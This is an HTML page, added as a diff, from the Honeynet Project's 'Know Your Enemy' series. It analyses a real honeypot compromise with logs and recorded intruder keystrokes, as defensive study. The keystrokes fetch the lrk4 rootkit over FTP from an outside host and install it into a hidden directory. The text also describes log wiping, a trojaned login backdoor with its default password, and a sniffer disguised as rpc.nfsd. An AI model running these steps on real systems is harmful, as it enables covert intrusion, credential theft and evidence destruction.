@@ -1,0 +1,356 @@
+<html>
+<head>
+   <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+   <meta name="description" content="What happens when a script kiddie gains root on your system.  Paper includes actual system logs and keystrokes from a compromised system">
+   <meta name="keywords" content="hacking,security,script kiddie,exploits,scans,black-hat,rewt,tools,rootkit,lrk4">
+   <meta name="GENERATOR" content="Mozilla/4.6 [en] (X11; I; SunOS 5.6 sun4u) [Netscape]">
+   <title>Know Your Enemy: III</title>
+<style type="text/css">
+<!--
+a:active {  text-decoration: none}
+a:hover {  text-decoration: none}
+a:link {  text-decoration: none}
+a:visited {  text-decoration: none}
+-->
+</style>
+
+</head>
+<body link="#0000FF">
+<center>
+<font face="Palatino,Book Antiqua"><font size=+4>Know Your Enemy: III</font></font>
+<br><i><font face="Palatino,Book Antiqua"><font size=+1>They Gain Root</font></font></i>
+<p>
+<font face="Palatino,Book Antiqua"><font size=-1>
+<a href="mailto:project@honeynet.org?Subject=Know Your Enemy">Honeynet Project</a>
+<br>
+<a href="http://project.honeynet.org">
+http://project.honeynet.org</a>
+</font></font>
+<br>Last Modified: 27 March, 2000
+</center>
+<p>
+<font face="Arial, Helvetica, sans-serif" size="2">
+This article is the third of a
+series focusing on the script kiddie.&nbsp; The 
+<a href="../enemy/index.html">first
+paper</a> focuses on how script kiddies probe for,&nbsp; identify, and
+exploit vulnerabilities.&nbsp; The <a href="../enemy2/index.html">second
+paper</a> focuses on how you can detect these attempts, identify what tools
+they are using and what vulnerabilities they are looking for.&nbsp; This
+paper, the third, focuses on what happens once they gain root.&nbsp; Specifically,
+how they cover their tracks and what they do next. You can download the actual
+raw data used for this paper <a href="../../misc/files/honeypot.tar.gz">
+here</a>.
+
+<p>
+<b><font face="Palatino,Book Antiqua"><font size=+2>Who is the script
+kiddie</font></font></b>
+
+<p>
+As we learned in the <a href="../enemy/index.html">first
+paper</a>, the script kiddie is not so much a person as it is a strategy,
+the strategy of probing for the easy kill. One is not searching for specific
+information or targeting a specific company, the goal is to gain root the
+easiest way possible. Intruders do this by focusing on a small number of
+exploits, and then searching the entire Internet for that exploit. Do not
+underestimate this strategy, sooner or later they find someone vulnerable.
+<p>Once they find a vulnerable system and gain root, their first step is
+normally to cover their tracks.&nbsp; They want to ensure you do not know
+your system was hacked and cannot see nor log their actions.&nbsp; Following
+this, they often use your system to scan other networks, or silently monitor
+your own. To gain a better understanding of how they accomplish these acts,
+we are going to follow the steps of a system compromised by an intruder
+using script kiddie tactics.&nbsp; Our system, called mozart, is a Linux
+box running Red Hat 5.1.&nbsp; The system was compromised on April 27,
+1999.&nbsp; Below are the actual steps our intruder took, with system logs
+and keystrokes to verify each step.&nbsp; All system logs were recorded
+to a protected syslog server, all keystrokes were captured using 
+<a href="ftp://ftp.technotronic.com/unix/network-sniffers/">sniffit</a>.&nbsp;
+For more information on how this information was captured, check out 
+<a href="../honeypot/index.html">To
+Build a Honeypot</a>".&nbsp; Throughout this paper our intruder is refered
+to as he, however we have no idea what the true gender of the intruder
+is.
+
+<p>
+<b><font face="Palatino,Book Antiqua"><font size=+2>The Exploit</font></font></b>
+<p>On 27 April, at 00:13 hours, our network was scanned by the system 1Cust174.tnt2.long-branch.nj.da.uu.net
+for several vulnerabilities, including imap.&nbsp; Our intruder came in
+noisy, as every system in the network was probed (for more information
+on detecting and analyzing scans, please see the 
+<a href="../enemy2/index.html">second
+paper</a> of this series).
+<p>
+<font face="Courier New,Courier"><font size=-1>
+Apr 27 00:12:25 mozart imapd[939]: connect from 208.252.226.174<br>
+Apr 27 00:12:27 bach imapd[1190]: connect from 208.252.226.174<br>
+Apr 27 00:12:30 vivaldi imapd[1225]: connect from 208.252.226.174<br>
+</font></font>
+<p>
+Apparently he found something he liked and returned at 06:52 and 16:47
+the same day.&nbsp; He started off with a more thorough scan, but this
+time focusing only on mozart.&nbsp; He identified a weakness and launched
+a successful attack against mountd, a commonly known vulnerability for
+Red Hat 5.1.&nbsp; Here we see in&nbsp; /var/log/messages the intruder
+gaining root.&nbsp; The tool used was most likely <a href="ftp://adm.freelsd.net/pub/ADM">ADMmountd.c</a>,
+or something similar to it.
+<p>
+<font face="Courier New,Courier"><font size=-1>
+Apr 27 16:47:28 mozart mountd[306]: Unauthorized access by NFS client 208.252.226.174.<br>
+Apr 27 16:47:28 mozart syslogd: Cannot glue message parts together<br>
+Apr 27 16:47:28 mozart mountd[306]: Blocked attempt of 208.252.226.174 to mount<br>
+~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P<br>
+~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~<br>
+</font></font>
+<p>
+Immediately following this exploit, we see in /var/log/messages our
+intruder gaining root by telneting in as the user crak0, and then su to
+the user rewt.&nbsp; Both of these accounts were added by the exploit script.&nbsp;
+Our intruder now has total control of our system.
+<p>
+<font face="Courier New,Courier"><font size=-1>
+Apr 27 16:50:27 mozart login[1233]: FAILED LOGIN 2 FROM 1Cust102.tnt1.long-branch.nj.da.uu.net
+FOR crak, User not known to the underlying authentication module<br>
+Apr 27 16:50:38 mozart PAM_pwdb[1233]: (login) session opened for user crak0 by (uid=0)<br>
+Apr 27 16:50:38 mozart login[1233]: LOGIN ON ttyp0 BY crak0 FROM 1Cust102.tnt1.long-branch.nj.da.uu.net<br>
+Apr 27 16:50:47 mozart PAM_pwdb[1247]: (su) session opened for user rewt by crak0(uid=0)<br>
+</font></font>
+<p>
+<b><font size=+2>Covering Their tracks</font></b>
+<p>The intruder is now on our system as root.&nbsp; As we are now about
+to see, the next step for him is to make sure he does not get caught.&nbsp;
+First, he checks to see if anyone else is on the system.
+</font>
+
+<pre>
+[crak0@mozart /tmp]$ w 
+  4:48pm  up 1 day, 18:27,  1 user,  load average: 0.00, 0.00, 0.00 
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU  WHAT 
+crak0    ttyp0    1Cust102.tnt1.lo  4:48pm  0.00s  0.23s  0.04s  w 
+</pre>
+
+<font face="Arial, Helvetica, sans-serif" size="2">
+After making sure the coast is clear, he will want to hide all of his
+actions. This normally entails removing any evidence from the logs files
+and replacing system binaries with trojans, such as ps or netstat, so you
+cannot see the intruder on your own system.&nbsp; Once the trojans are
+in place, the intruder has gained total control of your system and you
+will most likely never know it. Just as there are automated scripts for
+hacking, there are also automated tools for hiding intruders, often called
+rootkits.&nbsp; One of the more common rootkits is 
+<a href="ftp://ftp.technotronic.com/unix/trojans">lrk4</a>.&nbsp;
+By executing the script, a variety of critical files are replaced, hiding
+the intruder in seconds.&nbsp; For more detailed information on rootkits,
+see
+the <a href="../enemy3/README.txt">README</a> that
+comes with lrk4.&nbsp; This will give you a better idea how rootkits work
+in general.&nbsp;&nbsp; I also recommend you check out 
+<a href="../enemy3/hide-n-seek.html">hide-and-seek</a>,
+a black-hat paper on covering your tracks.
+<p>Within minutes of compromising our system, we see the intruder downloading
+the rootkit&nbsp; and then implementing the script with the command 
+"<font face="Courier New,Courier"><font size=-1>make
+install</font></font>".&nbsp;&nbsp; Below are the actual keystrokes the
+intruder typed to hide himself.
+
+<p>
+<font face="Courier New,Courier"><font size=-1>
+cd /dev/<br>
+su rewt<br>
+mkdir ". "<br>
+cd ". "<br>
+ftp technotronic.com<br>
+anonymous<br>
+fdfsfdsdfssd@aol.com<br>
+cd /unix/trojans<br>
+get lrk4.unshad.tar.gz<br>
+quit<br>
+ls<br>
+tar -zxvf lrk4.unshad.tar.gz<br>
+mv lrk4 proc<br>
+mv proc ". "<br>
+cd ". "<br>
+ls<br>
+make install<br>
+</font></font>
+
+<p>
+Notice the first thing that our intruder did, he created the hidden
+directory ".&nbsp; " to hide his toolkit.&nbsp; This directory does not
+show up with the "<font face="Courier New,Courier"><font size=-1>ls</font></font>"
+command, and looks like the local directory with "<font face="Courier New,Courier"><font size=-1>ls
+-la</font></font>" command. One way you can locate the directory is with
+the "<font face="Courier New,Courier"><font size=-1>find</font></font>"
+command (be sure you can trust the integrity of your 
+"<font face="Courier New,Courier"><font size=-1>find</font></font>" binary).
+
+<p>
+<font face="Courier New,Courier"><font size=-1>
+mozart #find / -depth -name "*.*"<br>
+/var/lib/news/.news.daily<br>
+/var/spool/at/.SEQ<br>
+/dev/. /. /procps-1.01/proc/.depend<br>
+/dev/. /.<br>
+/dev/<br>
+</font></font>
+
+<p>
+Our intruder may have been somewhat sophisticated in using trojan binaries,
+but had a simpler approach to cleaning the logs files.&nbsp; Instead of
+using cleaning tools such as zap2 or clean, he copied /dev/null to the
+files /var/run/utmp and /var/log/utmp, while deleting /var/log/wtmp.&nbsp;
+You know something is wrong when these logs files contain no data, or you
+get the following error:
+
+<p>
+<font face="Courier New,Courier"><font size=-1>
+[root@mozart sbin]# last -10<br>
+last: /var/log/wtmp:<br>
+No such file or directory<br>
+Perhaps this file was removed by the operator to prevent logging last info.
+</font></font>
+
+<p>
+<b><font size=+2>The Next Step</font></b>
+<p>Once a system has been compromised, intruders tend to do one of two
+things.&nbsp; First, they use your system as a launching pad and scan or
+exploit other systems.&nbsp; Second, they decided to lay low and see what&nbsp;
+they can learn about your system, such as accounts for other systems.&nbsp;
+Our intruder decided for option number two, lay low and see what he could
+learn.&nbsp; He implemented a sniffer on our system that would capture
+all of our network traffic, including telnet and ftp sessions to other
+systems.&nbsp; This way he could learn logins and passwords.&nbsp; We see
+the sytem going into promiscuous mode in /var/log/messages soon after the
+compromise.
+<p>
+<font face="Courier New,Courier"><font size=-1>
+Apr 27 17:03:38 mozart kernel: eth0: Setting promiscuous mode.<br>
+Apr 27 17:03:43 mozart kernel: eth0: Setting promiscuous mode.</font></font>
+<p>
+After implementing the trojan binaries, clearning the log files, and
+starting the sniffer, our intruder disconnected from the system.&nbsp;
+However, we will see him returning the next day to find what traffic he
+captured.
+
+<p><b><font size=+2>Damage Control</font></b>
+<p>
+Since our friend had disconnected, this gave me a chance to review the
+system and see what exactly happened.&nbsp; I was extremely interested
+to see what was altered, and where he was logging the sniffer information.&nbsp;
+First, I quickly identified with <a href="http://www.tripwire.com">tripwire</a>
+which files were modified.&nbsp;&nbsp;&nbsp; Note, make sure you run tripwire
+from a valid source.&nbsp; I like to run a statically-linked version of
+tripwire from a read-only floppy.&nbsp; Tripwire showed the following.
+</font>
+
+<pre>
+added:   -rw-r--r-- root            5 Apr 27 17:01:16 1999 /usr/sbin/sniff.pid 
+added:   -rw-r--r-- root          272 Apr 27 17:18:09 1999 /usr/sbin/tcp.log 
+changed: -rws--x--x root        15588 Jun  1 05:49:22 1998 /bin/login 
+changed: drwxr-xr-x root        20480 Apr 10 14:44:37 1999 /usr/bin 
+changed: -rwxr-xr-x root        52984 Jun 10 04:49:22 1998 /usr/bin/find 
+changed: -r-sr-sr-x root       126600 Apr 27 11:29:18 1998 /usr/bin/passwd 
+changed: -r-xr-xr-x root        47604 Jun  3 16:31:57 1998 /usr/bin/top 
+changed: -r-xr-xr-x root         9712 May  1 01:04:46 1998 /usr/bin/killall 
+changed: -rws--s--x root       116352 Jun  1 20:25:47 1998 /usr/bin/chfn 
+changed: -rws--s--x root       115828 Jun  1 20:25:47 1998 /usr/bin/chsh 
+changed: drwxr-xr-x root         4096 Apr 27 17:01:16 1999 /usr/sbin 
+changed: -rwxr-xr-x root       137820 Jun  5 09:35:06 1998 /usr/sbin/inetd 
+changed: -rwxr-xr-x root         7229 Nov 26 00:02:19 1998 /usr/sbin/rpc.nfsd 
+changed: -rwxr-xr-x root       170460 Apr 24 00:02:19 1998 /usr/sbin/in.rshd 
+changed: -rwxr-x--- root       235516 Apr  4 22:11:56 1999 /usr/sbin/syslogd 
+changed: -rwxr-xr-x root        14140 Jun 30 14:56:36 1998 /usr/sbin/tcpd 
+changed: drwxr-xr-x root         2048 Apr  4 16:52:55 1999 /sbin 
+changed: -rwxr-xr-x root        19840 Jul  9 17:56:10 1998 /sbin/ifconfig 
+changed: -rw-r--r-- root          649 Apr 27 16:59:54 1999 /etc/passwd 
+</pre>
+
+<p>
+<font face="Arial, Helvetica, sans-serif" size="2">
+As you can see, a variety of binaries and files were modified.&nbsp;
+There were no new entries in /etc/passwd (wisely, he had removed the crak0
+and rewt accounts), so our intruder must have left a backdoor in one of
+the modified binaries.&nbsp; Also, two files were added, /usr/sbin/sniff.pid
+and /usr/sbin/tcp.log.&nbsp; Not suprisingly, /usr/sbin/sniff.pid was the
+pid of the sniffer, /usr/sbin/tcp.log was where he was storing all of his
+captured information.&nbsp; Based on /usr/sbin/sniff.pid, the sniffer turned
+out to be rpc.nfsd.&nbsp; Our intruder had compiled a sniffer, in this
+case linsniffer, and replaced rpc.nfsd with it.&nbsp; This ensured that
+if the system was rebooted, the sniffer would be restarted by the init
+process.&nbsp; Strings confirms rpc.nfsd is the sniffer:
+<p>
+<font face="Courier New,Courier"><font size=-1>
+mozart #strings /usr/sbin/rpc.nfsd | tail -15<br>
+cant get SOCK_PACKET socket<br>
+cant get flags<br>
+cant set promiscuous mode<br>
+----- [CAPLEN Exceeded]<br>
+----- [Timed Out]<br>
+----- [RST]<br>
+----- [FIN]<br>
+%s =><br>
+%s [%d]<br>
+sniff.pid<br>
+eth0<br>
+tcp.log<br>
+cant open log<br>
+rm %s<br>
+</font></font>
+<p>
+After reviewing the system and understanding what happened, I left the
+system alone.&nbsp; I was curious to see what the intruder's next steps
+would be.&nbsp; I did not want him to know that I had caught him, so I
+removed all of my entries from /usr/sbin/tcp.log.
+<p><b><font size=+2>The Script Kiddie Returns</font></b>
+<p>The following day our friend returned.&nbsp; By logging his keystrokes,
+I quickly identified the backdoor, /bin/login was trojaned.&nbsp; This
+binary, used for telnet connections, was configured to allow the account
+"rewt" root privileges with the password "satori".&nbsp; The password "satori"
+is the default password for all trojaned binaries that the rootkit lrk4
+uses, a giveaway that your system may have been compromised.
+<p>The intruder was checking on his sniffer to ensure it was still functioning.&nbsp;
+Also, he wanted to confirm if any accounts were captured since the previous
+day.&nbsp;&nbsp; You can review his keystrokes at 
+<a href="../enemy3/keystrokes.txt">keystrokes.txt</a>.&nbsp;
+Notice at the bottom of the log our intruder kills the sniffer.&nbsp; This
+was the last thing he did before terminating the session.&nbsp; However,
+he quickly returned several minutes later with another session, only to
+start the sniffer again.&nbsp; I'm not exactly sure why he did this.
+<p>This process of checking the system continued for several days.&nbsp;
+Every day the intruder would connect to the system to confirm the sniffer
+was running&nbsp; and if it had captured any valuable data.&nbsp; After
+the fourth day, I decided that this was enough and disconnected the system.&nbsp;
+I had learned enough from the intruder's actions and was not going to learn
+anything new.
+<p>
+<b><font face="Palatino,Book Antiqua"><font size=+2>Conclusion</font></font></b>
+<p>
+We have seen in this paper how an intruder may act , from start to finish,
+once they gain root on your system. They often begin by checking to see
+if anyone is on the system.&nbsp; Once they know the coast is clear, they
+cover their tracks by clearing the logfiles and replacing or modifying
+critical files. Once they are safely hidden, they move onto new and more
+damaging activities.&nbsp; These tactics are here to stay, as new exploits
+are constantly being discovered. To better protect yourself against these
+threats, I recommend you armor your systems.&nbsp; Basic armoring will
+protect against most script kiddie threats, as they normally go for the
+easy kill.&nbsp; For ideas on how to armor your system, check out <a href="http://www.enteract.com/~lspitz/linux.html">Armoring
+Linux</a> or <a href="http://www.enteract.com/~lspitz/armoring.html">Armoring
+Solaris</a>.&nbsp; If it is to late and you feel your system has already
+been compromised, a good place to start is CERT's site "<a href="http://www.cert.org/nav/recovering.html">Recovering
+from an Incident</a>" .
+
+<br>
+<p>
+<br>
+<center>      
+<a href="http://project.honeynet.org">
+<img src="http://project.honeynet.org/small.gif" alt="The Honeynet Project" border=0>
+</a>
+</center>
+<br>
+<p>
+<br>
+
+</body>
+</html>
